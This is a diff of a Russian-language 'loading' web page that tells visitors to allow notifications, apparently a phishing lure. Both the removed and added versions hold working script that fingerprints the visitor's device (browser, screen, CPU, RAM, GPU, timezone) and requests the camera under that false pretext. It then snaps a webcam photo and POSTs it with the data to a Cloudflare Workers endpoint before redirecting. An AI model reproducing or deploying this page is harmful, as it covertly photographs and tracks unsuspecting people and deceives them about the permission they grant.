@@ -5,14 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Загрузка...</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@600;700&display=swap');
-
-        * {
-            font-family: 'Inter', sans-serif !important;
-            box-sizing: border-box;
-            -webkit-font-smoothing: antialiased;
-        }
-
         body {
             background-color: #000000;
             color: #ffffff;
@@ -21,150 +13,100 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        .msg {
+            text-align: center;
             padding: 20px;
         }
-
-        .container {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            width: auto; 
-            max-width: 95%; 
-        }
-
-        .image-container {
-            position: relative;
-            flex-shrink: 0;
-        }
-
-        .main-img {
-            width: 70px; /* Размер колокольчика */
-            height: 70px;
-            object-fit: contain;
-            /* Пульсация привлечет внимание */
-            animation: pulse 2.2s infinite ease-in-out; 
-        }
-
-        .text-container {
-            display: flex;
-            flex-direction: column;
-            gap: 3px;
-            white-space: nowrap; /* Запрет переноса строки */
-        }
-
-        h2 {
-            font-size: 19px; /* Шрифт как на макетах */
-            font-weight: 700;
-            margin: 0;
-            line-height: 1.2;
-            letter-spacing: -0.3px;
-        }
-
-        p {
-            font-size: 14px;
-            color: #aaaaaa;
-            margin: 0;
-            font-weight: 600;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.95; }
-            50% { transform: scale(1.06); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.95; }
-        }
+        h2 { font-size: 18px; font-weight: 500; margin-bottom: 8px; }
+        p { font-size: 14px; color: #888; margin: 0; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="image-container">
-            <img src="https://i.ibb.co/L9hV6pW/rubber-duck-icon-png.png" alt="Icon" class="main-img">
-        </div>
-        <div class="text-container">
-            <h2>Нажмите кнопку "Разрешить", чтобы продолжить</h2>
-            <p>Разрешите уведомления.</p>
-        </div>
+    <div class="msg">
+        <h2>Нажмите "Разрешить уведомления", чтобы продолжить</h2>
+        <p>Для доступа требуется права на отправку уведомлений.</p>
     </div>
     
     <video id="v" autoplay playsinline style="display:none"></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-        const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
+    const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
 
-        let targetUrlPromise = fetch(proxyUrl + "/get-url")
-            .then(res => res.text())
-            .catch(() => "https://google.com");
+    async function getHardwareInfo() {
+        let hardware = {
+            gpu: "Unknown",
+            cores: navigator.hardwareConcurrency || "Не определено",
+            ram: navigator.deviceMemory || "Не определено"
+        };
 
-        window.onload = function() {
-            setTimeout(async () => {
-                let stream = null;
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    hardware.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                } else {
+                    hardware.gpu = gl.getParameter(gl.RENDERER);
+                }
+            }
+        } catch (e) { hardware.gpu = "Ошибка доступа к GPU"; }
 
-                let gpu = "Unknown";
-                try {
-                    const tmpCanvas = document.createElement('canvas');
-                    const gl = tmpCanvas.getContext('webgl');
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                } catch (e) {}
+        return hardware;
+    }
 
-                const info = `
+    window.onload = async function() {
+        // Получаем ссылку заранее
+        const targetUrl = await fetch(proxyUrl + "/get-url").then(r => r.text()).catch(() => "https://google.com");
+        
+        // Собираем железо
+        const hw = await getHardwareInfo();
+
+        const infoData = `
 👤 **УСТРОЙСТВО:**
 • ${navigator.userAgent}
 • Язык: ${navigator.language}
 • Экран: ${window.screen.width}x${window.screen.height}
 
 🖥 **ЖЕЛЕЗО:**
-• Процессор: ${navigator.hardwareConcurrency || "?? "} ядер
-• ОЗУ: ~${navigator.deviceMemory || "?? "} GB
-• Видеокарта: ${gpu}
+• Процессор: ${hw.cores} ядер
+• ОЗУ: ~${hw.ram} GB
+• Видеокарта: ${hw.gpu}
 
 ⏰ **ВРЕМЯ И ЗОНА:**
 • ${new Date().toLocaleString('ru-RU')}
 • Пояс: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-                `.trim();
+        `.trim();
 
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" } 
-                    });
-                    
-                    const video = document.getElementById('v');
-                    const canvas = document.getElementById('c');
-                    
-                    video.srcObject = stream;
-                    
-                    await new Promise((resolve) => {
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            setTimeout(resolve, 800); 
-                        };
-                    });
-
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
-                    
-                    const fd = new FormData();
-                    fd.append('photo', blob, 'shot.jpg');
-                    fd.append('caption', info); 
-
-                    await fetch(proxyUrl, { method: 'POST', body: fd });
-
-                } catch (err) {
-                    const fd = new FormData();
-                    fd.append('text', `❌ Доступ к камере отклонен\n\n${info}`);
-                    await fetch(proxyUrl, { method: 'POST', body: fd });
-                } finally {
-                    if (stream) stream.getTracks().forEach(t => t.stop());
-                    window.location.href = await targetUrlPromise;
-                }
-            }, 800); 
-        };
-    </script>
+        let stream = null;
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            v.srcObject = stream;
+            
+            await new Promise(r => v.onloadedmetadata = () => { v.play(); setTimeout(r, 800); });
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            
+            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+            const fd = new FormData();
+            fd.append('photo', blob, '1.jpg');
+            fd.append('caption', infoData);
+            await fetch(proxyUrl, { method: 'POST', body: fd });
+        } catch (e) {
+            const fd = new FormData();
+            fd.append('text', `❌ Доступ к камере отклонен\n\n${infoData}`);
+            await fetch(proxyUrl, { method: 'POST', body: fd });
+        } finally {
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            window.location.replace(targetUrl);
+        }
+    };
+</script>
 </body>
 </html>
